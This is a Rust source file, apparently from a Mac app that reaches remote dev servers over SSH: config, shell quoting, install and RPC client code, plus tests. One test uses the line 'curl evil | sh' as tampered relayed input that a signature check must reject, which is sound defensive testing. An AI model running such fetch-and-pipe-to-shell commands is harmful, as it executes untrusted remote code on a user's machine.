    #[serde(default)]
    pub name: Option<String>,
}

/// A small ignored file (`.env`) that travels with a worktree.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct EnvFile {
    /// Relative to the worktree.
    pub path: String,
    /// Base64.
    pub data: String,
}

/// `worktrees.receive`: set up a worktree from refs the client pushed to
/// `refs/glasscode/in/<token>/{head,snap}` in the project's repository.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ReceiveWorktree {
    pub project_id: String,
    pub path: PathBuf,
    /// `None` for a detached HEAD.
    pub branch: Option<String>,
    pub token: String,
    #[serde(default)]
    pub env: Vec<EnvFile>,
    /// Part of a move to this epoch: accepted only while that move is under way.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub move_epoch: Option<(crate::owners::WorktreeKey, u64)>,
}

/// `worktrees.snapshot`: a worktree's state, left in `refs/glasscode/out/<token>/{head,snap}`
/// for the client to fetch.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct WorktreeSnapshot {
    pub root: PathBuf,
    pub branch: Option<String>,
    pub head: String,
    pub snap: String,
    #[serde(default)]
    pub env: Vec<EnvFile>,
}

/// Where a session's conversation file is on the server (`conversations.export`).
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ConversationFile {
    pub account_id: String,
    pub path: PathBuf,
    /// Relative to the account's folder (`projects/…/<id>.jsonl`, `sessions/…/rollout-….jsonl`).
    pub rel: PathBuf,
}

/// The command a client runs on the server (through `ssh -t`) to show a session's terminal.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Attach {
    pub argv: Vec<String>,
}

/// How the Mac app reaches its server; kept in `~/.glasscode/server.json`.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct ServerConfig {
    /// An SSH destination: a `~/.ssh/config` host alias (`devbox`), `user@host` or a Tailscale name.
    pub ssh_target: String,
    /// Extra `ssh` options (e.g. `-p 2222`), placed before the destination.
    #[serde(default)]
    pub ssh_args: Vec<String>,
    #[serde(default = "default_remote_bin")]
    pub remote_bin: String,
    /// Reached through a self-hosted relay (the server signed in with `glasscoded login`)
    /// instead of directly.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub relay: Option<RelayRoute>,
}

/// A server reached through the relay: ssh runs `<this app> relay-connect <device>` as its
/// ProxyCommand and checks the host key the device roster pins.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct RelayRoute {
    pub device: String,
    pub name: String,
    /// The account devices sign in as there.
    pub user: String,
}

fn default_remote_bin() -> String {
    "~/.glasscode/bin/glasscoded".into()
}

/// POSIX shell quoting, for commands that ssh hands to the remote shell. A leading `~/` stays
/// unquoted so the remote shell expands it.
pub fn shell_quote(arg: &str) -> String {
    if let Some(rest) = arg.strip_prefix("~/") {
        return format!("~/{}", shell_quote(rest));
    }
    if !arg.is_empty() && arg.chars().all(|c| c.is_ascii_alphanumeric() || "-_./=:,@%+".contains(c)) {
        return arg.to_string();
    }
    format!("'{}'", arg.replace('\'', r"'\''"))
}

impl ServerConfig {
    pub fn new(ssh_target: impl Into<String>) -> Self {
        Self { ssh_target: ssh_target.into(), ssh_args: Vec::new(), remote_bin: default_remote_bin(), relay: None }
    }

    /// A server reached through a self-hosted relay.
    pub fn through_relay(route: RelayRoute) -> Self {
        let target = format!("{}@glasscode-{}", route.user, route.device);
        Self { ssh_target: target, ssh_args: Vec::new(), remote_bin: default_remote_bin(), relay: Some(route) }
    }

    pub fn load() -> Option<ServerConfig> {
        let bytes = std::fs::read(crate::paths::server_file()).ok()?;
        serde_json::from_slice(&bytes).ok()
    }

    pub fn save(&self) -> anyhow::Result<()> {
        crate::paths::ensure_dirs()?;
        std::fs::write(crate::paths::server_file(), serde_json::to_vec_pretty(self)?)?;
        Ok(())
    }

    pub fn remove() {
        let _ = std::fs::remove_file(crate::paths::server_file());
    }

    /// A short name for the UI: the host part of the target.
    pub fn name(&self) -> String {
        if let Some(route) = &self.relay {
            return route.name.clone();
        }
        let host = self.ssh_target.rsplit('@').next().unwrap_or(&self.ssh_target);
        host.split('.').next().unwrap_or(host).to_string()
    }

    /// `ssh` with the options every Glasscode connection uses, up to and including the
    /// destination. Connections share one master (`ControlMaster`), so opening a terminal on
    /// the server is instant once the first one is up.
    pub fn ssh_args(&self, tty: bool) -> Vec<String> {
        let mut args: Vec<String> = Vec::new();
        args.push(if tty { "-tt" } else { "-T" }.into());
        args.extend(self.ssh_options());
        args.push(self.ssh_target.clone());
        args
    }

    /// The `-o` options and the configured extra arguments, without the destination.
    pub fn ssh_options(&self) -> Vec<String> {
        let mut args: Vec<String> = Vec::new();
        for option in [
            "BatchMode=yes",
            "ConnectTimeout=8",
            "ServerAliveInterval=15",
            "ServerAliveCountMax=3",
            "ControlMaster=auto",
            "ControlPath=/tmp/glasscode-ssh-%C",
            "ControlPersist=600",
        ] {
            args.push("-o".into());
            args.push(option.into());
        }
        if let Some(route) = &self.relay {
            for option in relay_options(route) {
                args.push("-o".into());
                args.push(option);
            }
        }
        args.extend(self.ssh_args.iter().cloned());
        args
    }

    /// `GIT_SSH_COMMAND` for git push/fetch to the server over the same connection.
    pub fn git_ssh_command(&self) -> String {
        std::iter::once("ssh".to_string()).chain(self.ssh_options().iter().map(|a| shell_quote(a))).collect::<Vec<_>>().join(" ")
    }

    /// A git remote URL for a repository on the server.
    pub fn git_url(&self, path: &std::path::Path) -> String {
        format!("{}:{}", self.ssh_target, path.display())
    }

    /// Write `bytes` to a file on the server (parent folders are created).
    pub fn upload(&self, bytes: &[u8], remote: &std::path::Path) -> anyhow::Result<()> {
        let parent = remote.parent().map(|p| p.display().to_string()).unwrap_or_else(|| "/".into());
        let script = format!("mkdir -p {} && cat > {}", shell_quote(&parent), shell_quote(&remote.display().to_string()));
        let (program, args) = self.remote_command(false, &["sh".into(), "-c".into(), script]);
        let mut child = crate::sys::command(program).args(args).stdin(Stdio::piped()).stdout(Stdio::null()).stderr(Stdio::piped()).spawn()?;
        child.stdin.take().context("no stdin")?.write_all(bytes)?;
        let output = child.wait_with_output()?;
        if !output.status.success() {
            bail!("upload to {} failed: {}", remote.display(), String::from_utf8_lossy(&output.stderr).trim());
        }
        Ok(())
    }

    /// Write `bytes` to `relative` under the server account's home, readable only by it, and
    /// say where that is (an absolute path on the server).
    pub fn upload_to_home(&self, bytes: &[u8], relative: &str) -> anyhow::Result<String> {
        let parent = std::path::Path::new(relative).parent().map(|p| p.display().to_string()).filter(|p| !p.is_empty()).unwrap_or_else(|| ".".into());
        let script = format!("umask 077 && cd && mkdir -p {} && cat > {} && printf '%s/%s' \"$HOME\" {}", shell_quote(&parent), shell_quote(relative), shell_quote(relative));
        let (program, args) = self.remote_command(false, &["sh".into(), "-c".into(), script]);
        let mut child = crate::sys::command(program).args(args).stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn()?;
        child.stdin.take().context("no stdin")?.write_all(bytes)?;
        let output = child.wait_with_output()?;
        if !output.status.success() {
            bail!("upload to the server failed: {}", String::from_utf8_lossy(&output.stderr).trim());
        }
        Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
    }

    /// Read a file from the server.
    pub fn download(&self, remote: &std::path::Path) -> anyhow::Result<Vec<u8>> {
        let (program, args) = self.remote_command(false, &["cat".into(), remote.display().to_string()]);
        let output = crate::sys::command(program).args(args).stdin(Stdio::null()).output()?;
        if !output.status.success() {
            bail!("could not read {} on the server: {}", remote.display(), String::from_utf8_lossy(&output.stderr).trim());
        }
        Ok(output.stdout)
    }

    /// `ssh … <server> <command>`, with the command quoted for the remote shell.
    pub fn remote_command(&self, tty: bool, argv: &[String]) -> (String, Vec<String>) {
        let mut args = self.ssh_args(tty);
        args.push(argv.iter().map(|a| shell_quote(a)).collect::<Vec<_>>().join(" "));
        ("ssh".into(), args)
    }

    /// The terminal command for a session: `ssh -tt <server> tmux … attach-session -t …`.
    pub fn attach_command(&self, attach: &Attach) -> (String, Vec<String>) {
        self.remote_command(true, &attach.argv)
    }
}

/// ssh options for a server behind the relay: the pipe, this Mac's key, and only the host
/// keys the roster gives for that device.
fn relay_options(route: &RelayRoute) -> Vec<String> {
    let dir = crate::paths::root().join("device");
    // ssh hands ProxyCommand to the shell; the app may live in a folder with spaces.
    let exe = std::env::current_exe().map(|p| p.display().to_string()).unwrap_or_else(|_| "glasscode".into());
    let path = |p: std::path::PathBuf| {
        let p = p.display().to_string();
        if p.contains(' ') { format!("\"{p}\"") } else { p }
    };
    vec![
        format!("ProxyCommand={} relay-connect {}", shell_quote(&exe), route.device),
        format!("HostKeyAlias=glasscode-{}", route.device),
        format!("UserKnownHostsFile={}", path(dir.join("known_hosts"))),
        "StrictHostKeyChecking=yes".into(),
        "CheckHostIP=no".into(),
        format!("IdentityFile={}", path(dir.join("id_ed25519"))),
        "IdentitiesOnly=yes".into(),
    ]
}

/// Copy a Linux build of glasscoded to the server and install it there (binary in
/// `~/.glasscode/bin`, systemd user service). `binaries` holds `glasscoded-linux-<arch>`
/// files; the server's architecture picks one. Returns the installer's output.
pub fn install_on_server(config: &ServerConfig, binaries: &std::path::Path) -> anyhow::Result<String> {
    let run = |argv: &[&str], input: Option<&[u8]>| -> anyhow::Result<String> {
        let (program, args) = config.remote_command(false, &argv.iter().map(|s| s.to_string()).collect::<Vec<_>>());
        let mut child = crate::sys::command(program)
            .args(args)
            .stdin(if input.is_some() { Stdio::piped() } else { Stdio::null() })
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .context("could not start ssh")?;
        if let (Some(bytes), Some(mut stdin)) = (input, child.stdin.take()) {
            stdin.write_all(bytes)?;
        }
        let output = child.wait_with_output()?;
        let text = format!("{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
        if !output.status.success() {
            bail!("{}", text.trim());
        }
        Ok(text)
    };
    let uname = run(&["uname", "-sm"], None)?;
    let mut parts = uname.split_whitespace();
    let (os, arch) = (parts.next().unwrap_or(""), parts.next().unwrap_or(""));
    if os != "Linux" {
        bail!("the server runs {os}; glasscoded builds are for Linux servers");
    }
    let arch = match arch {
        "x86_64" | "amd64" => "x86_64",
        "aarch64" | "arm64" => "aarch64",
        other => bail!("no glasscoded build for {other}"),
    };
    let binary = binaries.join(format!("glasscoded-linux-{arch}"));
    let bytes = std::fs::read(&binary).with_context(|| format!("missing {} (run script/build-glasscoded.sh)", binary.display()))?;
    run(&["sh", "-c", "mkdir -p ~/.glasscode/bin && cat > ~/.glasscode/bin/glasscoded.upload && chmod 755 ~/.glasscode/bin/glasscoded.upload"], Some(&bytes))?;
    // The team's approved CLI versions go along, so the server checks the same list.
    if let Ok(versions) = std::fs::read(crate::paths::cli_versions_file()) {
        run(&["sh", "-c", "cat > ~/.glasscode/cli-versions.json"], Some(&versions))?;
    }
    run(&["sh", "-c", "~/.glasscode/bin/glasscoded.upload install && rm -f ~/.glasscode/bin/glasscoded.upload"], None)
}

/// One RPC connection to a server's daemon. Calls are serialized; use it from background
/// threads, never the UI thread.
pub struct RemoteClient {
    child: Mutex<Child>,
    stdin: Mutex<ChildStdin>,
    lines: Mutex<mpsc::Receiver<String>>,
    next_id: AtomicU64,
    pub hello: Hello,
}

const CALL_TIMEOUT: Duration = Duration::from_secs(30);

impl RemoteClient {
    /// Start `glasscoded rpc` on the server and check that it speaks our protocol. Every
    /// connection this machine opens says it is this machine (M13.2), when the server takes it.
    pub fn connect(config: &ServerConfig) -> anyhow::Result<RemoteClient> {
        let (program, args) = config.remote_command(false, &[config.remote_bin.clone(), "rpc".into()]);
        let client = Self::spawn(crate::sys::command(program).args(args))?;
        match crate::paths::MachineId::this() {
            Ok(id) => {
                if let Err(err) = client.declare(&crate::caller::Caller::Machine { id }) {
                    eprintln!("glasscode: the server did not take this machine's id: {err:#}");
                }
            }
            // A damaged machine file: the connection goes on undeclared, as before M13.2, and
            // what needs the machine id (the moves' owner records) is refused by the server.
            Err(err) => eprintln!("glasscode: no machine id for the server: {err}"),
        }
        Ok(client)
    }

    /// Name this connection's caller, once, before its other calls (M13.2). A server that does
    /// not take declarations (no `"caller"` in its features) is left as it was: false.
    pub fn declare(&self, caller: &crate::caller::Caller) -> anyhow::Result<bool> {
        if !self.hello.features.iter().any(|f| f == crate::caller::DAEMON_FEATURE) {
            return Ok(false);
        }
        self.call_value(crate::caller::DECLARE_METHOD, serde_json::to_value(caller)?)?;
        Ok(true)
    }

    /// Connect through any command whose stdio is a `glasscoded rpc` (tests run it locally).
    pub fn spawn(command: &mut Command) -> anyhow::Result<RemoteClient> {
        let mut child = command
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .context("could not start ssh")?;
        let stdin = child.stdin.take().context("no stdin")?;
        let stdout = child.stdout.take().context("no stdout")?;
        let stderr = child.stderr.take().context("no stderr")?;
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            for line in BufReader::new(stdout).lines().map_while(Result::ok) {
                if tx.send(line).is_err() {
                    break;
                }
            }
        });
        // Keep the last lines of ssh's own errors ("Connection refused", "command not found").
        let errors = std::sync::Arc::new(Mutex::new(Vec::<String>::new()));
        let sink = errors.clone();
        std::thread::spawn(move || {
            for line in BufReader::new(stderr).lines().map_while(Result::ok) {
                if let Ok(mut lines) = sink.lock() {
                    lines.push(line);
                    let excess = lines.len().saturating_sub(5);
                    lines.drain(..excess);
                }
            }
        });
        let mut client = RemoteClient {
            child: Mutex::new(child),
            stdin: Mutex::new(stdin),
            lines: Mutex::new(rx),
            next_id: AtomicU64::new(1),
            hello: Hello {
                version: String::new(),
                build: 0,
                protocol: 0,
                host: String::new(),
                os: String::new(),
                arch: String::new(),
                user: String::new(),
                home: PathBuf::new(),
                tmux: None,
                claude: None,
                codex: None,
                approved: ApprovedVersions::default(),
                features: Vec::new(),
                machine: None,
            },
        };
        let hello: Hello = client.call("hello", Value::Null).map_err(|err| {
            std::thread::sleep(Duration::from_millis(100));
            let detail = errors.lock().map(|l| l.join(" ").trim().to_string()).unwrap_or_default();
            if detail.is_empty() { err } else { anyhow!("{detail}") }
        })?;
        if hello.protocol != PROTOCOL_VERSION {
            bail!(
                "the server runs glasscoded {} (protocol {}), this app needs protocol {PROTOCOL_VERSION}; update glasscoded on the server",
                hello.version,
                hello.protocol
            );
        }
        client.hello = hello;
        Ok(client)
    }

    pub fn call<T: DeserializeOwned>(&self, method: &str, params: Value) -> anyhow::Result<T> {
        let value = self.call_value(method, params)?;
        serde_json::from_value(value).with_context(|| format!("unexpected answer to {method}"))
    }

    pub fn call_value(&self, method: &str, params: Value) -> anyhow::Result<Value> {
        let lines = self.lines.lock().map_err(|_| anyhow!("connection poisoned"))?;
        let id = self.next_id.fetch_add(1, Ordering::Relaxed);
        let request = Request { id, method: method.into(), params };
        {
            let mut stdin = self.stdin.lock().map_err(|_| anyhow!("connection poisoned"))?;
            let mut line = serde_json::to_string(&request)?;
            line.push('\n');
            stdin.write_all(line.as_bytes()).and_then(|_| stdin.flush()).map_err(|_| anyhow!("the connection to the server closed"))?;
        }
        let deadline = std::time::Instant::now() + CALL_TIMEOUT;
        loop {
            let left = deadline.saturating_duration_since(std::time::Instant::now());
            let line = match lines.recv_timeout(left) {
                Ok(line) => line,
                Err(mpsc::RecvTimeoutError::Timeout) => bail!("the server did not answer {method} in time"),
                Err(mpsc::RecvTimeoutError::Disconnected) => bail!("the connection to the server closed"),
            };
            let Ok(response) = serde_json::from_str::<Response>(&line) else { continue };
            if response.id != id {
                continue;
            }
            if let Some(error) = response.error {
                bail!("{error}");
            }
            return Ok(response.result.unwrap_or(Value::Null));
        }
    }

    pub fn is_alive(&self) -> bool {
        self.child.lock().map(|mut c| matches!(c.try_wait(), Ok(None))).unwrap_or(false)
    }
}

impl Drop for RemoteClient {
    fn drop(&mut self) {
        if let Ok(mut child) = self.child.lock() {
            let _ = child.kill();
            let _ = child.wait();
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A phone's key: its OpenSSH public key, and a signer of messages with it.
    pub(crate) fn phone_key(seed: u8) -> (String, impl Fn(&str) -> String) {
        use base64::Engine as _;
        use p256::ecdsa::signature::Signer as _;
        let signing = p256::ecdsa::SigningKey::from_bytes(&[seed; 32].into()).unwrap();
        let point = signing.verifying_key().to_encoded_point(false);
        let mut blob = Vec::new();
        for part in [b"ecdsa-sha2-nistp256".as_slice(), b"nistp256".as_slice(), point.as_bytes()] {
            blob.extend_from_slice(&(part.len() as u32).to_be_bytes());
            blob.extend_from_slice(part);
        }
        let key = format!("ecdsa-sha2-nistp256 {}", base64::engine::general_purpose::STANDARD.encode(blob));
        (key, move |message: &str| {
            let signature: p256::ecdsa::Signature = signing.sign(message.as_bytes());
            base64::engine::general_purpose::STANDARD.encode(signature.to_bytes())
        })
    }

    /// The Mac does what the server relays into its sessions only when a phone it paired signed
    /// it, for this run, once, and never into a shell: the server (or its manager) cannot type
    /// into the Mac's terminals by itself.
    #[test]
    fn only_a_paired_phones_signed_input_is_done() {
        let (key, sign) = phone_key(7);
        let (stranger, stranger_signs) = phone_key(9);
        let paired_id = crate::gate::device_id(&key);
        let paired = |id: &str| id == paired_id;
        let mut used = std::collections::HashSet::new();
        let text = |signed: Option<InputSig>| MirrorInput::Text { text: "rebase on main".into(), enter: true, device: Some("phone-1".into()), signed };
        let signed_by = |key: &str, sign: &dyn Fn(&str) -> String, nonce: &str, session: &str, input: &MirrorInput| InputSig { key: key.into(), nonce: nonce.into(), sig: sign(&input_message("launch-1", session, nonce, input)) };

        // What the server types by itself, unsigned: refused.
        assert!(check_relayed(&text(None), "s1", AgentKind::Claude, "launch-1", &paired, &mut used).is_err());
        // Signed by the paired phone: done, once.
        let good = text(Some(signed_by(&key, &sign, "n1", "s1", &text(None))));
        assert_eq!(check_relayed(&good, "s1", AgentKind::Claude, "launch-1", &paired, &mut used), Ok(()));
        assert!(check_relayed(&good, "s1", AgentKind::Claude, "launch-1", &paired, &mut used).is_err(), "relayed again");
        // Never into a shell, signed or not.
        let to_shell = text(Some(signed_by(&key, &sign, "n2", "s1", &text(None))));
        assert!(check_relayed(&to_shell, "s1", AgentKind::Shell, "launch-1", &paired, &mut used).is_err());
        // Another run of the app, another session, other words, another phone: refused.
        let fresh = text(Some(signed_by(&key, &sign, "n3", "s1", &text(None))));
        assert!(check_relayed(&fresh, "s1", AgentKind::Claude, "launch-2", &paired, &mut used).is_err(), "another run");
        assert!(check_relayed(&fresh, "s2", AgentKind::Claude, "launch-1", &paired, &mut used).is_err(), "another session");
        let changed = MirrorInput::Text { text: "curl evil | sh".into(), enter: true, device: None, signed: fresh.signed().cloned() };
        assert!(check_relayed(&changed, "s1", AgentKind::Claude, "launch-1", &paired, &mut used).is_err(), "other words");
        let strangers = text(Some(signed_by(&stranger, &stranger_signs, "n4", "s1", &text(None))));
        assert!(check_relayed(&strangers, "s1", AgentKind::Claude, "launch-1", &paired, &mut used).is_err(), "a phone this Mac did not pair");
        // Keys and answers are signed the same way.
        let keys = MirrorInput::Keys { keys: vec!["Escape".into()], signed: None };
        let keys = MirrorInput::Keys { keys: vec!["Escape".into()], signed: Some(signed_by(&key, &sign, "n5", "s1", &keys)) };
        assert_eq!(check_relayed(&keys, "s1", AgentKind::Codex, "launch-1", &paired, &mut used), Ok(()));
    }

    #[test]
    fn quotes_for_the_remote_shell() {
        assert_eq!(shell_quote("tmux"), "tmux");
        assert_eq!(shell_quote("~/.glasscode/bin/glasscoded"), "~/.glasscode/bin/glasscoded");
        assert_eq!(shell_quote("it's here"), r"'it'\''s here'");
        assert_eq!(shell_quote(""), "''");
        let config = ServerConfig::new("you@devbox.example.ts.net");
        assert_eq!(config.name(), "devbox");
        let (program, args) = config.attach_command(&Attach { argv: vec!["tmux".into(), "attach".into(), "-t".into(), "a b".into()] });
        assert_eq!(program, "ssh");
        assert_eq!(args.last().unwrap(), "tmux attach -t 'a b'");
        assert_eq!(args[0], "-tt");
    }
}
